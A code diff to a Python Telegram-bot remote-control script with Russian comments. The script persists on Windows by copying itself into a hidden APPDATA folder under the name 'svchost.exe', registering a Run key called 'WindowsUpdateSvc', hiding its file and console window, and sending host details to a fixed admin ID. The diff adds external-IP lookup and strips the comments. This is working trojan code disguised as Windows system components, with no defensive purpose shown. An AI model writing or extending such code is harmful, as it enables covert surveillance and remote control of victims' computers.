@@ -18,7 +18,7 @@ ADMIN_ID = 8527578981
 
 # Пути для маскировки
 HIDDEN_FOLDER = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Updates')
-PROCESS_NAME = "svchost.exe"  # Имя процесса в диспетчере задач
+PROCESS_NAME = "svchost.exe"
 
 class PCManager:
     def __init__(self):
@@ -34,11 +34,18 @@ class PCManager:
         return socket.gethostname()
     
     def get_system_info(self):
+        try:
+            import requests
+            ext_ip = requests.get('https://api.ipify.org', timeout=3).text
+        except:
+            ext_ip = "Не определен"
+            
         info = {
             'id': self.pc_id,
             'computer': self.pc_name,
             'user': self.user_name,
             'local_ip': socket.gethostbyname(socket.gethostname()),
+            'external_ip': ext_ip,
             'os': platform.system() + ' ' + platform.release(),
             'last_seen': time.strftime('%H:%M %d.%m.%Y')
         }
@@ -48,20 +55,16 @@ pc = PCManager()
 bot = telebot.TeleBot(BOT_TOKEN)
 
 def add_to_startup():
-    """Добавление в автозагрузку с маскировкой"""
     try:
-        # Создаем скрытую папку
         if not os.path.exists(HIDDEN_FOLDER):
             os.makedirs(HIDDEN_FOLDER)
         
-        # Копируем себя в скрытую папку
         current_file = os.path.abspath(sys.argv[0])
         hidden_file = os.path.join(HIDDEN_FOLDER, PROCESS_NAME)
         
         if current_file != hidden_file:
             shutil.copy2(current_file, hidden_file)
         
-        # Добавляем в реестр (автозагрузка)
         import winreg
         key = winreg.HKEY_CURRENT_USER
         subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -69,19 +72,15 @@ def add_to_startup():
         with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
             winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{hidden_file}"')
         
-        # Делаем файл скрытым
         subprocess.run(f'attrib +h "{hidden_file}"', shell=True)
         
-        # Создаем маркер что уже установлено
         with open(os.path.join(HIDDEN_FOLDER, '.installed'), 'w') as f:
             f.write('installed')
-            
         return True
-    except Exception as e:
+    except:
         return False
 
 def send_startup_notification():
-    """Отправка уведомления о запуске"""
     time.sleep(5)
     try:
         info = pc.get_system_info()
@@ -145,20 +144,16 @@ def restart(message):
             os.system("shutdown -r now")
 
 def main():
-    # Скрываем консоль
     if platform.system() == "Windows":
         import ctypes
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     
-    # Добавляем в автозагрузку при первом запуске
     marker = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Updates', '.installed')
     if not os.path.exists(marker):
         add_to_startup()
     
-    # Отправляем уведомление о запуске
     Thread(target=send_startup_notification).start()
     
-    # Запускаем бота
     while True:
         try:
             bot.polling(non_stop=True, interval=0)
